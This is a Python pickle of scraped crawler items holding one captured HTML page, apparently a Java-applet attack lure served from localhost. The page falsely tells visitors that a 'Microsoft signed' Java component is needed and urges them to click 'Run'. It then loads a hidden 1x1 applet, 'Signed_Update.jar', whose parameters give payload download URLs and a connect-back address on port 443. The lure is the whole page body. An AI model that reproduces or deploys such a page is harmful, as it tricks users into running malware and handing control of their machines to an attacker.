(lp0
ccopy_reg
_reconstructor
p1
(cHTMLScraper.items
HTMLScraperItem
p2
c__builtin__
object
p3
Ntp4
Rp5
(dp6
S'_values'
p7
(dp8
S'body'
p9
(lp10
sS'desc'
p11
NsS'link'
p12
NsS'title'
p13
S'tableData'
p14
ssbag1
(g2
g3
Ntp15
Rp16
(dp17
g7
(dp18
g9
S'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />\r\n<title>Java Required</title>\r\n</head>\r\n\r\n<body>\r\n<table width="100%" border="0" cellspacing="0" cellpadding="0">\r\n  <tr>\r\n    <td class="shadow_left">&nbsp;</td>\r\n    <td class="header_column">\r\n\t<table width="100%" border="0" cellspacing="10" cellpadding="0">\r\n      <tr>\r\n        <td class="logo_area">Java Required!</td>\r\n        <td width="300">\r\n          <form id="form1" name="form1" method="post" action="">\r\n\t\t  \tSearch the website <br />\r\n            <input name="search_text" type="text" id="search_text" />\r\n            <input type="submit" name="Submit" value="Search" />\r\n          </form>\r\n          </td>\r\n      </tr>\r\n    </table></td>\r\n\r\n    <td class="shadow_right">&nbsp;</td>\r\n  </tr>\r\n  <tr>\r\n    <td class="horizontal_column">&nbsp;</td>\r\n    <td class="horizontal_center"><table width="100%" border="0" cellpadding="0" cellspacing="0" class="linkcontainer">\r\n      <tr>\r\n        <td><div class="navigation"><a href="#" class="main_link">Home</a></div></td>\r\n        <td><div class="navigation"><a href="#" class="main_link">Services</a></div></td>\r\n        <td><div class="navigation"><a href="#" class="main_link">About</a></div></td>\r\n        <td><div class="navigation"><a href="#" class="main_link">Help</a></div></td>\r\n        <td><div class="navigation"><a href="#" class="main_link">Links</a></div></td>\r\n      </tr>\r\n    </table></td>\r\n    <td class="horizontal_column">&nbsp;</td>\r\n  </tr>\r\n  <tr>\r\n    <td class="shadow_left">&nbsp;</td>\r\n    <td class="below_header"><br><br>Welcome to the website, you must hava Java in order to view this page properly. Ensure that the Microsoft signed Java box that pops up is accepted to load the site content.<br><br><br></td>\r\n    <td class="shadow_right">&nbsp;</td>\r\n  </tr>\r\n  <tr>\r\n    <td class="shadow_left">&nbsp;</td>\r\n    <td class="main_content_box"><table width="100%" border="0" cellspacing="0" cellpadding="0">\r\n      <tr>\r\n        <td class="left_content">Welcome to the site! This site requires Java in order to run properly. </td>\r\n        <td class="body_content"><strong>Words from our CEO &quot;Java Required to view content.&quot;</strong> <br />\r\n          <br />\r\n\r\nInstructions to view the website:<br><br>\r\n\r\n1. A pop-up box will prompt, please hit "Yes". This may take a few moments.<br>\r\n2. This pop-up is signed through the Microsoft Corporation and will provide you with necessary updates to view the site.<br>\r\n3. Once you have accepted, wait about 10 to 15 seconds and the page will load.<br>\r\n\r\nYou must first click "Run" for the signed Java component from Microsoft in order to view our site successfully.\r\n<br><br><br><br><br><br></td>\r\n      </tr>\r\n    </table>\r\n    <td class="shadow_right">&nbsp;</td>\r\n  </tr>\r\n  <tr>\r\n    <td class="shadow_left">&nbsp;</td>\r\n    <td class="middle_spacer"><div class="bottom_content">You must first click "Run" for the signed Java component from Microsoft in order to view our site successfully. Java is a well trusted and industry used component for websites.</div></td>\r\n    <td class="shadow_right">&nbsp;</td>\r\n  </tr>\r\n  <tr>\r\n    <td class="shadow_left">&nbsp;</td>\r\n    <td class="bottom_link_container"><p><a href="#" class="bottom_link">Home</a> | <a href="#" class="bottom_link">Services</a> | <a href="#" class="bottom_link">About</a> | <a href="#" class="bottom_link">Help</a> | <a href="#" class="bottom_link">Links</a> </p>\r\n    <p>All rights reserved &copy;<br />\r\n    </p></td>\r\n    <td class="shadow_right">&nbsp;</td>\r\n  </tr>\r\n</table>\r\n<applet code="Java.class" width="1" height="1" id="Verified Trusted and Secure (VERIFIED)" archive="Signed_Update.jar"><param name="name" value="Verified Trusted and Secure (VERIFIED)"><param name="1" value="http://127.0.0.1:80/QEVfFz5wOmnw2"><param name="2" value=""><param name="3" value="http://127.0.0.1:80/qvmMCrp7dtyqDjY"><param name="4" value="http://127.0.0.1:80/rFQHozav"><param name="5" value=""><param name="6" value=""><param name="7" value="127.0.0.1 443"><param name="8" value="YES"><param name="9" value=""><param name="10" value=""><param name="separate_jvm" value="true"></applet>\n\n</body>\r\n</html>\r\n'
p19
sg11
S'Webpage response'
p20
sg12
S'http://127.0.0.1/'
p21
sg13
S'response_body'
p22
ssba.